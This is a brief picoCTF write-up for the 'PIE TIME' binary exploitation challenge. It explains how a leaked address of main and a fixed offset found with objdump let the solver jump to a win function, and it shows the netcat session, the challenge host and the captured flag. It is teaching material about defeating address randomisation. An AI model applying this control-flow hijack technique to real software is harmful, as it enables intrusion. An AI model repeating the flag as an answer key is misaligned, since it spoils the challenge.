# PIE TIME — picoCTF (Binary Exploitation, Easy)

## Overview

A PIE (Position Independent Executable) binary leaks the runtime address of `main` and lets us jump to any address. The goal is to redirect execution to the `win()` function, which prints the flag.

## Analysis

The source code reveals:

- `win()` opens and prints `flag.txt` — this is our target
- `main()` prints its own runtime address, then reads a hex address from stdin and jumps to it via a function pointer
- A `segfault_handler` catches bad jumps

Since PIE is enabled, the binary loads at a random base address every run. However, the **offsets between functions are constant** — they're baked into the ELF at compile time.

## Finding the offset

Using `objdump` to get the static offsets:

```bash
$ objdump -t vuln | grep -E "win|main"
00000000000012a7 g     F .text  0000000000000096  win
000000000000133d g     F .text  00000000000000cc  main
```

The offset between `main` and `win`:

```
main - win = 0x133d - 0x12a7 = 0x96
```

So at runtime: `win_addr = main_addr - 0x96`

## Exploit

```bash
$ nc rescued-float.picoctf.net 56485
Address of main: 0x58580c67c33d
Enter the address to jump to, ex => 0x12345: 58580c67c2a7
Your input: 58580c67c2a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_f8845f06}
```

## Key takeaway

PIE randomizes the base address on each execution, but the relative offsets between symbols remain fixed. Leaking any one address is enough to calculate every other function's runtime address.
